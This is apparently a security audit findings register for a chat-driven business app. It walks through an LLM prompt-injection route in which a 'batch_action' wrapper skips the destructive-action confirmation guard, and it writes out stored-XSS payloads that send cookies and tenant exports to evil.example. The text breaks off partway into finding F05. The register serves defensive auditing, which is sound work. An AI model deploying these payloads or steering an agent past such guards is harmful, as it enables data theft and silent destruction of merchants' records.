# Ojunai — Security Audit #2 (Findings Register)

**Date:** 2026-07-13  
**Method:** Multi-agent audit — 11 parallel domain finders → adversarial verification of every finding → completeness critic. 59 agents, 42 findings raised, **30 CONFIRMED** after adversarial verification.  
**Scope:** Full repo re-audit on branch `security/audit-fixes-2026-07` (audit #1 fixes applied), including adversarial re-review of those applied fixes.  
**Branch state:** All code changes uncommitted on `security/audit-fixes-2026-07`; `main` untouched.

## Severity summary

| Severity | Count |
|---|---|
| High | 6 |
| Medium | 10 |
| Low | 14 |
| **Total** | **30** |

## Coverage limitations (honest gaps)

- **11 of 59 agents failed on API session limits** (reset 3:30pm America/Toronto). The adversarial *chase* round for 12 completeness-critic leads mostly did not run, so those leads are **UNVERIFIED** — listed at the end as follow-ups, NOT as conclusions.
- 1 agent ran while the safety classifier was unavailable (EventsController lead); treat its output with extra scrutiny.
- This is a source-code + static review. No live pen-test, no infra/cloud console access, no dependency CVE scan in this pass.

## Fix status — REMEDIATION COMPLETE (29 of 30 fixed in code; 1 documented owner-action)

All fixes are on branch `security/audit-fixes-2026-07` (uncommitted; `main` untouched). API build green; 34 security unit tests pass.

| Finding | Fix |
|---|---|
| F00/F02 batch_action bypass (High) | ✅ `DestructiveIntentGuard` recurses into `batch_action.complete[]`; regression tests added |
| F01/F03 Export print/PDF XSS (High) | ✅ `escapeHtml` applied to every interpolated value on the print path (`export/page.tsx`) |
| F04 Telegram cross-chat dedup drop (High) | ✅ dedup key is now `{chatId}:{messageId}` (`TelegramAdapter`) |
| F05 Channel signup unverified phone (High) | ⚠️ **Owner action** — needs a phone-ownership proof step (WhatsApp OTP / Telegram request_contact) which requires new persistent state (schema migration) + a signup state-machine change. False "verified contact-share" comment corrected; full remediation in Operations Checklist. **Gate before enabling channel signup in prod.** |
| F06 plain /register OTP bypass (Med) | ✅ endpoint returns 410; signup must use the OTP flow |
| F07 Voice-AI reservation write IDOR (Med) | ✅ ownership pre-check (fails open only when indeterminate) before relaying status/sell |
| F08 repeatable higher-tier trials (Med) | ✅ one-trial-per-tier via persisted `trial.started` BillingEvent |
| F09 change-plan free upgrade (Med) | ✅ rank compared against paid `SubscribedPlan`, not trial-inflated `Plan` |
| F10/F12 Export PIN lockout race (Med) | ✅ atomic increment-before-compare (`AddOrUpdate`) |
| F11 import dedup TOCTOU (Med) | ✅ Postgres transaction-scoped advisory lock around check+insert |
| F13/F20/F22 onboarding-analytics admin key (Med/Low) | ✅ routed through `ValidateAdminKey` (case-sensitive + audit) |
| F14 webhook PII logging (Med) | ✅ sender redacted; body only at Debug, CR/LF-stripped |
| F15 Flutterwave pack IDOR (Med) | ✅ ownership check on `parts[3]` businessId in pack path |
| F16 reset enumeration + role leak (Low) | ✅ staff/unknown cases now return the generic response |
| F17 tokenVersion fail-open (Low) | ✅ fails closed on missing/unparseable claim |
| F18 token scan Take(50) (Low) | ✅ `{rowId}.{secret}` selector → indexed PK lookup, legacy scan fallback |
| F19 SalesService ContactId IDOR (Low) | ✅ ownership check before attaching contact |
| F21 Flutterwave voice_ai amount (Low) | ✅ fail-closed amount check vs tier price (server-verified amount) |
| F23 admin key in URL (Low) | ✅ prefers `X-Admin-Key` header; query kept as deprecated fallback (see Operations Checklist) |
| F24 Content-Disposition injection (Low) | ✅ filename sanitized to a safe alphabet |
| F25 voice-ai status param injection (Low) | ✅ `Uri.EscapeDataString` on status |
| F26 verbose exception messages (Low) | ✅ framework-leak messages genericized; all mapped errors now logged |
| F27 Paystack annual price mismatch (Low) | ✅ cycle-correct expected price + cycle-correct extension |
| F28 Messenger dropped batch events (Low) | ✅ all events parsed and enqueued |
| F29 link-token consume race (Low) | ✅ atomic conditional `ExecuteUpdateAsync` |

**Operator actions still required** (cannot be resolved in code alone): rotate the Flutterwave webhook secret + admin key (exposed via URL/logs historically); apply the F05 signup-verification change before enabling Telegram/Messenger signup in production; migrate admin tooling to the `X-Admin-Key` header. See `SECURITY_OPERATIONS_CHECKLIST.md`.

---

## F00 · [High] DestructiveIntentGuard confirmation is fully bypassable via batch_action (zero-all-stock, clear-all-debts, delete-catalogue, add-staff run with no confirmation) — ✅ FIXED (this session)
- **Domain:** ai-agent · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-863 Incorrect Authorization (missing confirmation gate) / OWASP LLM06 Excessive Agency
- **OWASP:** LLM06:2025 Excessive Agency / Insufficient guardrails on high-impact AI-parsed actions
- **Component:** AI intent dispatch / DestructiveIntentGuard confirmation flow
- **Files:** Ojunai.API/Common/DestructiveIntentGuard.cs, Ojunai.API/Services/WhatsAppService.cs, Ojunai.API/Services/Channels/Telegram/TelegramIntentHandler.cs, Ojunai.API/Services/Channels/Messenger/MessengerIntentHandler.cs

**Description:** The prior audit added DestructiveIntentGuard so that irreversible/bulk/account-impacting AI intents (delete_product deleteAll, delete_product deleteCategory, remove_inventory zeroAll, record_receivable_payment/record_payable_payment clearAllDebts, add_staff) require an explicit YES before executing. The guard, however, inspects a SINGLE intent+payload (DestructiveIntentGuard.DescribeIfDestructive), and the confirmation gate that calls it runs only against the top-level parsed.Intent: WhatsAppService.cs:624, TelegramIntentHandler.cs:252, MessengerIntentHandler.cs:181. The batch_action intent carries destructive operations as SUB-intents inside its 'complete' array. HandleBatchActionAsync (WhatsAppService.cs:2436-2462) iterates those sub-actions and calls ExecuteIntentAsync directly for each, with NO DestructiveIntentGuard check. Because the top-level intent is literally "batch_action" (never a flagged intent), the confirmation prompt is skipped entirely and the sub-action executes immediately. The sub-action executors honor the bulk flags unconditionally: HandleRecordPaymentAsync clears EVERY contact balance on clearAllDebts=='true' (WhatsAppService.cs:1692-1723); HandleRemoveInventoryAsync zeroes ALL stock on zeroAll=='true' (WhatsAppService.cs:1520-1535); delete_product deleteAll and add_staff likewise. This defeats the entire purpose of the guard — the control was specifically to stop a misread or injected instruction from silently wiping a catalogue, zeroing all stock, clearing all debts, or provisioning staff, and batch_action makes every one of those reachable with no confirmation. The task brief explicitly flagged 'an intent variant not covered like batch_action' as the thing to check; it is not covered. This applies to all three channels: on Telegram/Messenger batch_action is not in DelegatedIntents and falls through to the catch-all DelegateToWhatsAppDispatcherAsync (TelegramIntentHandler.cs:299-307, MessengerIntentHandler.cs:213-221) → ExecuteIntentForUserAsync → HandleBatchActionAsync, again with only the top-level (non-destructive) intent having passed the guard.

**Attack scenario:** A merchant (or anyone controlling a linked chat, or a prompt-injection that steers the model) sends a message that bundles a destructive action with any trivial one so the model classifies it as batch_action. Examples confirmed to reach the destructive executor with NO confirmation: (1) "sold 1 rice and clear all debts" → batch_action{complete:[create_sale, record_receivable_payment{clearAllDebts:"true"}]} → every receivable balance is marked paid (HandleRecordPaymentAsync:1692). (2) "log 500 transport and delete all stock" → sub-action remove_inventory{zeroAll:"true"} zeroes all products (1520). (3) "note fuel 1k and delete all my products" → delete_product{deleteAll:"true"} deactivates the whole catalogue. (4) "sold 2 rice and add staff John +234... as admin" → add_staff runs unconfirmed. Standalone, each of these triggers the ⚠️ YES/NO gate; wrapped in a batch, it runs on the spot.

**Preconditions:** Any linked chat user whose role holds the sub-action's permission (e.g. Owner, or a staffer with ManageDebts/ManageStock). No injection needed — the model emits batch_action whenever the message lists 2+ actions. An attacker/user simply bundles a destructive op with a trivial one.

**Impact:** Silent, unconfirmed execution of the exact irreversible/bulk operations the guard was added to protect: mass debt write-off (financial-integrity loss — every outstanding receivable/payable marked settled), full inventory zero-out, full catalogue deletion, and staff provisioning. Trivially triggered by normal phrasing or by any indirect prompt-injection that can nudge the model toward a batch classification, and it removes the last human-in-the-loop check for a possibly-misparsed instruction.

**Evidence:** DestructiveIntentGuard.cs:19-63 (takes a single intent+JsonElement; no notion of nested/batch actions). WhatsAppService.cs:624-642 (DescribeIfDestructive called only on parsed.Intent; on YES-less path executes ExecuteIntentAsync). WhatsAppService.cs:2427-2462 (HandleBatchActionAsync builds subParsed per element and calls ExecuteIntentAsync with no destructive check). WhatsAppService.cs:1692-1723 (clearAllDebts executes across all contacts). WhatsAppService.cs:1520-1535 (zeroAll clears all product stock). TelegramIntentHandler.cs:252-267 and 299-307 (guard on top-level intent only; batch_action falls through to WhatsApp dispatcher). MessengerIntentHandler.cs:181-196 and 213-221 (same). batch_action is a first-class supported intent in the system prompt (ClaudeParsingService.cs:463-466, 938-966) and a HighRiskIntent that the model is actively prompted to emit for multi-action messages.

**Recommended fix:** Apply the destructive check to sub-actions, not just the envelope. Preferred: in HandleBatchActionAsync, before executing each sub-action, call DestructiveIntentGuard.DescribeIfDestructive(subIntent, subPayload); if any element is destructive, do not execute the batch inline — stash the whole batch as a confirm_destructive pending action (listing each destructive effect) and require YES, then replay. Alternatively, add a guard helper that recurses into batch_action 'complete'/'pending' arrays and returns a combined description, and call it in all three channel gates (WhatsAppService.cs:624, TelegramIntentHandler.cs:252, MessengerIntentHandler.cs:181) so batch_action containing any flagged sub-intent is forced through confirmation. Also add a regression test asserting that a batch containing clearAllDebts/zeroAll/deleteAll/add_staff triggers confirmation on every channel.

**Verification:** Every link in the finder's chain checks out against the source. DestructiveIntentGuard.DescribeIfDestructive (DestructiveIntentGuard.cs:19-63) matches only a single flat intent+payload and has no case for batch_action. The three channel gates call it exclusively on the top-level parsed.Intent (WhatsAppService.cs:624, TelegramIntentHandler.cs:252, MessengerIntentHandler.cs:181); a batch_action envelope is never flagged, so the confirmation prompt is skipped. Execution then reaches HandleBatchActionAsync (WhatsAppService.cs:2427-2462), which iterates complete[] and calls ExecuteIntentAsync directly per sub-action with no destructive-guard check. ExecuteIntentAsync (878-960) does only a role-permission check before dispatch, and the bulk executors honor the flags unconditionally: zeroAll wipes all stock (1520-1535), clearAllDebts settles every contact balance (1692-1723), delete_product deleteAll deactivates the catalogue (2925). Telegram/Messenger route batch_action through DelegateToWhatsAppDispatcherAsync -> ExecuteIntentForUserAsync (867-875) -> ExecuteIntentAsync -> HandleBatchActionAsync, reproducing the bypass on all channels. The parsing prompt (ClaudeParsingService.cs:463-466, 756-763, 799, 938-966) makes the model emit these destructive flags inside batch sub-actions for ordinary phrasing, so the attack examples are realistic and require no injection. The guard's own comments name both misread and injected messages as its threat model, and the batch path defeats it for all four destructive categories.

---

## F01 · [High] Stored XSS via unescaped report data in the print-report window (about:blank injection, bypasses CSP)
- **Domain:** files-import-export · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-79
- **OWASP:** A03:2021 Injection
- **Component:** Dashboard export/print (client)
- **Files:** dashboard/src/app/(dashboard)/export/page.tsx

**Description:** printReport() (export/page.tsx line 102) and printRichReport() (line 136) build an HTML document by string-interpolating report cells directly into markup with no escaping: line 125 emits `<td>${cell ?? ""}</td>` for every row cell, and line 124 does the same for headers; printRichReport injects raw section HTML at line 161. The rows passed in include untrusted, cross-user data — e.g. sales export passes s.customerName and s.itemSummary (lines 297-298), expenses passes e.notes and e.paidTo (lines 333-334), contacts passes c.name and c.phoneNumber (lines 395-397), inventory passes p.name and supplier name (lines 361, 371). A value like `<img src=x onerror=fetch('https://evil/?c='+document.cookie)>` or an inline `<script>` is written verbatim. The document is created via window.open('', '_blank') then win.document.write(html) (lines 130-131 / 165-166); an about:blank document created this way runs in the opener's origin, and injected inline scripts execute (document.write'd script tags run). Because the API client uses cookie auth (withCredentials:true, api.ts line 31), the injected script can issue same-session authenticated fetch() calls to the API, enabling account takeover / data exfiltration.

**Attack scenario:** 1) Attacker (a customer of the merchant) causes their contact name to be set to `<script>fetch('/api/business/export',{credentials:'include'}).then(r=>r.text()).then(d=>navigator.sendBeacon('https://evil.example/x',d))</script>` — e.g. by placing an order over WhatsApp or via a crafted CSV import. 2) Merchant opens Export > Contacts (or Sales) and clicks Print. 3) The new window renders the name unescaped; the script runs in the dashboard origin with the merchant's session and exfiltrates the full business export.

**Preconditions:** Attacker controls a text field that lands in an exportable record for a target business — e.g. a customer/contact name, product name, expense note, category, or 'Paid To' value. These are populated from untrusted sources: inbound WhatsApp/Telegram messages, CSV import, and customer-supplied names. The merchant then clicks 'Print' on the corresponding Export card.

**Impact:** Execution of arbitrary JavaScript in the merchant's authenticated dashboard session → session/data theft, full account/business data exfiltration, or authenticated actions on the merchant's behalf.

**Evidence:** export/page.tsx:124-125 `${headers.map(h => \`<th>${h}</th>\`)...}` and `${rows.map(row => ... \`<td>${cell ?? ""}</td>\` ...)}`; win.document.write at line 130. printRichReport raw section injection at export/page.tsx:161. Untrusted sources: sales customerName export/page.tsx:297, expense notes/paidTo :333-334, contacts name/phone :395-397. Cookie-based auth: dashboard/src/lib/api.ts:31. Note: the added dashboard CSP (next.config.mjs, comment lines 7-8) deliberately does NOT constrain script-src, and in any case an about:blank document.write payload carries no CSP, so the CSP fix does not mitigate this sink.

**Recommended fix:** HTML-encode every interpolated value (cells, headers, title, businessName, and printRichReport section content) before building the print document — escape &, <, >, ", '. Prefer building the DOM with createElement/textContent over document.write, or render the print view as a normal same-origin Next route that React escapes. Do not treat business-name/title as trusted either.

**Verification:** Every load-bearing claim checks out against the source. printReport (export/page.tsx:102) builds HTML by string-interpolating headers (line 124) and cells (line 125: `<td>${cell ?? ""}</td>`) with zero escaping, then calls win.document.write(html) (line 130) on a window.open("","_blank") about:blank document. printRichReport (line 136) injects raw section content at line 161, and that content embeds unescaped r.contactName (line 565) and p.name (line 579). The rows carry attacker-controllable, cross-user data: sales customerName/itemSummary (297-298), expense notes/paidTo (333-334), contact name/phone (395-397), product name (361) — sourced from WhatsApp/Telegram/CSV/customer input. I confirmed the backend does NOT HTML-sanitize these fields (ContactService stores `contact.Name = request.Name` raw; no sanitize/HtmlEncode anywhere in the service or controller); the app relies on React's auto-escaping everywhere else, and this print path is the anomaly that bypasses it. Inline-script execution via document.write is proven by the helper's own `<script>window.print();</script>` running the same way; an injected `<script>` or `<img src=x onerror=...>` executes identically. The about:blank document inherits the opener's (dashboard) origin, and the CSP does not mitigate: next.config.mjs line 17 sets only frame-ancestors/base-uri/object-src/form-action and deliberately omits script-src (comment lines 7-9 confirm this was intentional), and a document.write'd about:blank document carries no CSP header regardless. api.ts line 31 uses withCredentials:true, so the injected script runs in the authenticated dashboard origin and can issue same-session API calls (the API's CORS already trusts the dashboard origin with credentials) or beacon data to an external host. The precondition (merchant clicks Print on the relevant Export card) is ordinary feature usage, and attacker (customer) vs victim (merchant) are distinct principals — genuine stored/cross-user XSS, not self-XSS. Recommendation to HTML-encode all interpolated values (or build DOM via textContent) is correct.

---

## F02 · [High] batch_action bypasses the DestructiveIntentGuard confirmation gate (incomplete fix) — ✅ FIXED (this session)
- **Domain:** fix-regression · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-863: Incorrect Authorization
- **OWASP:** A01:2021 Broken Access Control
- **Component:** AI chat intent dispatch (WhatsApp/Telegram/Messenger)
- **Files:** Ojunai.API/Services/WhatsAppService.cs, Ojunai.API/Common/DestructiveIntentGuard.cs, Ojunai.API/Services/Channels/Telegram/TelegramIntentHandler.cs, Ojunai.API/Services/Channels/Messenger/MessengerIntentHandler.cs

**Description:** The just-added destructive-intent confirmation is only enforced at the top-level pre-dispatch layer (WhatsAppService.cs:624, Channels/Telegram/TelegramIntentHandler.cs:252, Channels/Messenger/MessengerIntentHandler.cs:181, all calling DestructiveIntentGuard.DescribeIfDestructive on the outer parsed intent). The 'batch_action' intent routes to HandleBatchActionAsync (WhatsAppService.cs:2427), which enumerates ba.complete[] and calls ExecuteIntentAsync(user, subParsed) for each sub-action (line 2452). ExecuteIntentAsync (line 878) performs only a role-permission check (lines 880-885) and never invokes DestructiveIntentGuard. Therefore any destructive intent nested inside a batch_action wrapper executes immediately with NO confirmation, fully bypassing the fix. This defeats exactly the threat the guard was built for: a misread or an injected instruction (e.g. via a stored product/contact name flowing into the prompt) that produces a destructive action. It affects all three channels because Telegram/Messenger delegate to the same WhatsApp dispatcher.

**Attack scenario:** Attacker (via prompt injection in a stored product/contact name or a crafted inbound message) causes Claude to emit intent=batch_action with complete=[{intent:'delete_product', deleteAll:'true'}] (or {intent:'remove_inventory', zeroAll:'true'} / {intent:'record_receivable_payment', clearAllDebts:'true'} / {intent:'add_staff', ...}). HandleBatchActionAsync dispatches each sub-intent through ExecuteIntentAsync, which never calls DestructiveIntentGuard, so the catalogue is permanently deleted / all stock zeroed / all debts cleared with no 'Reply YES to confirm' step.

**Preconditions:** Claude emits (or is induced to emit) a batch_action wrapping a destructive sub-intent; the acting user's role has the underlying permission (e.g. business owner, the default and the target of prompt-injection).

**Impact:** Full bypass of the destructive-action confirmation control: irreversible catalogue deletion, stock zeroing, mass debt clearing, or staff provisioning without any human confirmation, including via indirect prompt injection.

**Evidence:** WhatsAppService.cs:2436-2452 loops completeEl.EnumerateArray() and calls `await ExecuteIntentAsync(user, subParsed)` per sub-action. ExecuteIntentAsync (WhatsAppService.cs:878-885) contains only the IntentPermissions/RolePermissions check — grep confirms DestructiveIntentGuard is referenced ONLY at WhatsAppService.cs:624, TelegramIntentHandler.cs:252, MessengerIntentHandler.cs:181, never inside ExecuteIntentAsync or HandleBatchActionAsync. delete_product/remove_inventory/record_receivable_payment/add_staff are all reachable sub-intents (WhatsAppService.cs:895,899,928,932).

**Recommended fix:** Apply the destructive guard where the action actually executes, not only at pre-dispatch. Inside HandleBatchActionAsync, call DestructiveIntentGuard.DescribeIfDestructive(intent, action) for each sub-action and refuse/queue-for-confirmation any flagged one (or reject a batch_action that contains any destructive sub-intent). Better: move the guard check to the top of ExecuteIntentAsync so every execution path (batch, resumed confirmations, sub-dispatch) is covered by a single choke point.

**Verification:** All load-bearing claims verified by reading the code. (1) DestructiveIntentGuard.DescribeIfDestructive is invoked ONLY at the three top-level pre-dispatch sites (WhatsAppService.cs:624, TelegramIntentHandler.cs:252, MessengerIntentHandler.cs:181); grep and manual inspection confirm it is never called in ExecuteIntentAsync or HandleBatchActionAsync. (2) The guard's switch (DestructiveIntentGuard.cs:34-57) has no case for 'batch_action', so a batch_action wrapper returns null and passes the gate at WhatsAppService.cs:625. (3) HandleBatchActionAsync (2436-2452) enumerates complete[] and calls ExecuteIntentAsync per sub-action; ExecuteIntentAsync (878-885) performs only the role-permission check, then dispatches straight into the destructive handlers (switch at 890-959). (4) The destructive handlers execute unconditionally: HandleDeleteProductAsync deletes ALL products on deleteAll=="true" (2925-2937), and HandleRemoveInventoryAsync (zeroAll), HandleRecordPaymentAsync (clearAllDebts), HandleAddStaffAsync are all reachable sub-intents matching exactly what the guard flags (DestructiveIntentGuard.cs:36-53). (5) All three channels are affected: Telegram routes batch_action through DelegateToWhatsAppDispatcherAsync -> ExecuteIntentForUserAsync -> ExecuteIntentAsync (TelegramIntentHandler.cs:299-327), same for Messenger. The one guard the finder might have overlooked — the per-sub-intent role/permission check inside ExecuteIntentAsync — does exist and does block low-privilege escalation, but it does NOT block the described attack: the control being bypassed is the destructive-confirmation gate, not the role check, and the injection target (business Owner) holds all permissions. This is a genuine, complete bypass of the newly-added confirmation control, reachable via indirect prompt injection (stored product/contact names flowing into the prompt) — precisely the threat model the guard was built to defend. Severity High is correct: a single choke-point control is fully defeated, enabling irreversible-feeling mass mutations (catalogue deletion, stock zeroing, debt clearing) with no human confirmation.

---

## F03 · [High] Stored DOM XSS in Export page print/PDF helpers — untrusted business data written to a same-origin popup via document.write with no HTML escaping
- **Domain:** frontend · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **OWASP:** A03:2021 Injection (XSS)
- **Component:** Dashboard frontend — Export & Share (print/PDF generation)
- **Files:** /Users/kendennis/Desktop/Ojunai-AI/dashboard/src/app/(dashboard)/export/page.tsx

**Description:** The two print helpers build an HTML document by directly string-interpolating server-returned record fields and then call win.document.write(html) into a popup opened with window.open("", "_blank"). No HTML escaping is applied on the print/PDF path (the CSV path is defended by escapeCsvCell at lines 48-55, but that helper is never used here). printReport interpolates every table cell and header raw: line 124 `headers.map(h => \`<th>${h}</th>\`)` and line 125 `row.map(cell => \`<td>${cell ?? ""}</td>\`)`, then writes it at line 130. printRichReport interpolates section HTML at line 161 and writes at line 165; handleMonthlyReport feeds it raw contact names and product names, e.g. line 565 `<td>${r.contactName}</td>` and line 579 `<td>${p.name}</td><td>${p.currentStock}</td>...`. The row data comes from the API list endpoints (/sales, /products, /contacts, /expenses, /dashboard/activity, /ledger/balances, /products/low-stock) and includes fields that are populated from untrusted external channels: product names, contact/customer names, expense notes/paidTo, item summaries, activity descriptions. Because document.write into a freshly-opened blank popup executes injected scripts (unlike React's innerHTML, and unlike dangerouslySetInnerHTML), a payload such as a product named `<img src=x onerror=...>` or `<svg onload=...>`, or even `<script>...</script>`, runs when the owner clicks the PDF/Print button. The popup is same-origin with the dashboard (about:blank inherits the opener origin), so the injected code runs in the dashboard's origin and can read localStorage (oj_business, oj_user) and issue credentialed (withCredentials) API calls to the backend with the victim owner's session cookie — reading or mutating that tenant's data. The session cookie itself is HttpOnly so it is not directly stealable, but the same-origin API access is sufficient for data exfiltration and actions on the owner's behalf. The dashboard CSP (next.config.mjs line 17) intentionally omits script-src/object-src-for-scripts and only sets frame-ancestors/base-uri/object-src/form-action, so it provides no mitigation against this injected inline script.

**Attack scenario:** 1) Attacker gets a malicious string persisted into the target business as a record field via an untrusted channel — e.g. places a WhatsApp/voice-AI order or is added as a contact/customer with name `<img src=x onerror="fetch('/api/contacts?page=1&pageSize=10000',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://evil.example/x',{method:'POST',body:d}))">`, or imports a product CSV with such a name, or sets an expense note payload. 2) The business owner opens the Export page and clicks 'PDF' (printReport) or 'Generate Monthly Report' (printRichReport). 3) The helper interpolates the unescaped field into the HTML string and calls win.document.write into the same-origin popup; the onerror handler fires and runs in the dashboard origin. 4) Script reads localStorage business/user data and makes credentialed calls to the API, exfiltrating the tenant's sales/contacts/financials or performing state-changing requests.

**Preconditions:** Attacker can get one string field of the target tenant populated via an untrusted channel (WhatsApp/voice order, contact creation, CSV import, expense note). The victim owner/staff must click a Print/PDF or Generate Monthly Report button on the Export page. No attacker authentication to the dashboard is required.

**Impact:** Execution of attacker JavaScript in the dashboard origin of any staff/owner who prints a report, enabling exfiltration of the tenant's full sales/contacts/financial data and credentialed state-changing API calls on the victim's behalf (cross-user within the tenant; potential privilege escalation if a payload planted by low-privilege staff/customer is printed by an owner).

**Evidence:** export/page.tsx line 125: `<tbody>${rows.map(row => \`<tr>${row.map(cell => \`<td>${cell ?? ""}</td>\`).join("")}</tr>\`).join("")}</tbody>` and line 130 `win.document.write(html)`; line 124 headers interpolated raw; printRichReport line 161 `${sections.map(s => \`<h2>${s.heading}</h2>${s.content}\`).join("")}` and line 165 `win.document.write(html)`; handleMonthlyReport line 565 `<td>${r.contactName}</td>` and line 579 `<tr><td>${p.name}</td><td>${p.currentStock}</td><td>${p.lowStockThreshold}</td><td>${p.unit}</td></tr>` — all fed from api.get responses (lines 290-292, 353-356, 492-498) whose fields originate from untrusted external input. The CSV escaper escapeCsvCell (lines 48-55) is applied only in downloadCsv (lines 59-60), never on the print path. next.config.mjs line 17 CSP has no script-src.

**Recommended fix:** HTML-escape every interpolated value on the print path before writing it into the document. Add an escapeHtml helper (replace & < > " ') and apply it to all cell values, headers, businessName, title, section headings, and every field interpolated inside printRichReport section content (contactName, product name/stock/unit, etc.). Prefer building the DOM with textContent / createElement over document.write, or render the report inside the app with React (which escapes by default) and use the browser print dialog. As defense-in-depth, add a script-src CSP (nonce-based) so injected inline scripts cannot execute even if an escaping gap remains.

**Verification:** Verified directly in dashboard/src/app/(dashboard)/export/page.tsx. Both print helpers build HTML by raw string interpolation of server-returned fields and write it into a same-origin popup via win.document.write: printReport interpolates headers (line 124) and cells (line 125), writes at line 130; printRichReport interpolates section heading/content (line 161), writes at line 165; handleMonthlyReport feeds raw r.contactName (line 565) and p.name/currentStock/lowStockThreshold/unit (line 579). No HTML escaping on this path — escapeCsvCell (lines 48-55) is used only inside downloadCsv (lines 59-60), confirming the finder's claim that the CSV defense is absent on print. Row data originates from API list endpoints (/sales, /products, /contacts, /expenses, /dashboard/activity, /ledger/balances, /products/low-stock) carrying customer/contact names, item summaries, product names, expense notes/paidTo, activity descriptions — fields plausibly settable via untrusted external channels (WhatsApp/voice-AI orders, contact creation, CSV import) in this platform. Script execution is proven by the code itself: both helpers append <script>window.print();</script> (lines 127, 162) delivered through document.write and relied upon to trigger the print dialog, which demonstrates that scripts written via document.write into the blank about:blank popup DO execute; the popup inherits the opener's dashboard origin. React's auto-escaping is irrelevant because the report bypasses React (raw string + document.write). CSP in next.config.mjs sets only frame-ancestors/base-uri/object-src/form-action with no script-src (comment confirms it was deliberately deferred), so injected inline scripts run unmitigated. api (src/lib/api.ts) uses withCredentials: true, so injected code in the dashboard origin can read localStorage (oj_business/oj_user) and make credentialed API calls. No unstated blocker refutes the attack; preconditions (plant a field via an external channel + owner clicks PDF/Print or Generate Monthly Report) are realistic. Severity High is correct: same-origin stored XSS enabling tenant data exfiltration and credentialed state-changing requests, with a low-privilege-to-owner escalation path; not Critical because it requires a victim click and the session cookie is HttpOnly (no direct cookie theft).

---

## F04 · [High] Telegram inbound dedup keyed on per-chat message_id silently drops other users' messages (cross-chat collision / DoS)
- **Domain:** webhooks-messaging-identity · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-694: Use of Multiple Resources with Duplicate Identifier
- **OWASP:** A04:2021 Insecure Design
- **Component:** Messaging dedup / webhook robustness (Telegram)
- **Files:** Ojunai.API/Services/Channels/Telegram/TelegramAdapter.cs, Ojunai.API/Services/InboundDedupService.cs, Ojunai.API/Data/AppDbContext.cs, Ojunai.API/Controllers/WebhooksController.cs

**Description:** Both dedup layers key an inbound Telegram message on its provider message id alone, not on the sender/chat. The atomic claim uses composite PK (Channel, ProviderMessageId) (AppDbContext.cs:331) and the controller pre-check queries MessageLogs where Channel=="Telegram" && WhatsAppMessageId==ProviderMessageId with NO chat scoping (WebhooksController.cs:308-320). For a regular Telegram message ProviderMessageId is msg.MessageId (TelegramAdapter.cs:134), which per the Bot API is 'unique inside this chat' only — it is a small per-chat integer that resets for every chat. Two different users therefore share message ids (both start near 1 and count up), so once user A's message id N is claimed, user B's message id N is treated as a duplicate and dropped. InboundDedupService.TryClaimAsync returns false on the unique-violation (InboundDedupService.cs:52-70) and the orchestrator returns without processing (ConversationOrchestrator.cs:71-75); the controller path returns Ok() without enqueuing. The MessageLog window is 180 days (MessageLogRetentionJobService default) and the claim window 30 days, so the collision surface spans the entire user base over months. Note the callback path deliberately uses cb_{update_id} (a globally-unique id, TelegramAdapter.cs:106) — confirming the author knew message_id needed a global id but missed it for regular messages.

**Attack scenario:** An attacker DMs the bot enough times to claim message-id values 1..N. Every subsequent new Telegram user whose early messages fall in that range has those messages silently dropped — the bot appears dead for them and any sale/expense they typed is never recorded. Even without an attacker, the second and later legitimate users collide with the first user's already-claimed ids, so most new users' first messages are dropped.

**Preconditions:** Multichannel Telegram path enabled; more than one Telegram user (or an attacker who first sends messages to the bot). No secrets needed.

**Impact:** Silent loss of legitimate inbound messages (unrecorded sales/expenses) for all but the first Telegram user, and a trivial denial-of-service where one sender suppresses other tenants' messages by pre-claiming id ranges.

**Evidence:** AppDbContext.cs:331 (HasKey Channel+ProviderMessageId); TelegramAdapter.cs:134 (ProviderMessageId = msg.MessageId.ToString()); WebhooksController.cs:308-320 (MessageLog dedup not scoped to sender); InboundDedupService.cs:52-73 (unique-violation => skip); ConversationOrchestrator.cs:71-75 (skip on failed claim). Contrast TelegramAdapter.cs:106 which uses globally-unique cb_{update_id} for callbacks.

**Recommended fix:** Include the chat/sender in the dedup identity for Telegram (e.g. store ProviderMessageId as chatId + ':' + message_id, or use update_id which is globally unique per bot). Apply the same sender-scoping to the MessageLog pre-check in WebhooksController. Backfill/namespace existing keys.

**Verification:** All cited code verified. AppDbContext.cs:331 keys the atomic claim on composite PK (Channel, ProviderMessageId) with no chat/sender component. WebhooksController.cs:308-312 pre-checks MessageLogs on Channel+WhatsAppMessageId(=ProviderMessageId) with no sender scoping. TelegramAdapter.cs:134 sets ProviderMessageId = msg.MessageId.ToString() for regular messages, and Telegram's Bot API documents message_id as unique only "inside this chat" — a per-chat integer that overlaps across chats. The callback path (TelegramAdapter.cs:106) deliberately uses the globally-unique cb_{update_id}, confirming the author knew a global id was needed and missed it for regular messages. Critically, SendAsync uses a single global Telegram:BotToken (TelegramAdapter.cs:145), so every tenant/user talks to the same bot and shares one global dedup namespace — making cross-chat collisions guaranteed rather than hypothetical. On collision InboundDedupService.cs:64-70 returns false and ConversationOrchestrator.cs:71-75 returns without processing; the controller returns Ok() without enqueuing. Net effect: once user A claims message_id N, any other user's message_id N is silently dropped for the retention window, and an attacker can pre-claim id ranges 1..N to suppress other tenants' inbound messages (unrecorded sales/expenses). No unstated guard blocks this; the only precondition is the Telegram path being active, which it is on main.

---

## F05 · [High] Channel-native signup creates active Owner accounts with an unverified, user-typed phone number (phone squatting + cross-channel WhatsApp hijack)
- **Domain:** webhooks-messaging-identity · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-640: Weak Password/Identity Recovery; CWE-345: Insufficient Verification of Data Authenticity
- **OWASP:** A07:2021 Identification and Authentication Failures
- **Component:** Onboarding / channel signup (Telegram + Messenger)
- **Files:** Ojunai.API/Services/Channels/Telegram/TelegramSignupHandler.cs, Ojunai.API/Services/Channels/Messenger/MessengerSignupHandler.cs, Ojunai.API/Services/AuthService.cs, Ojunai.API/Services/WhatsAppService.cs

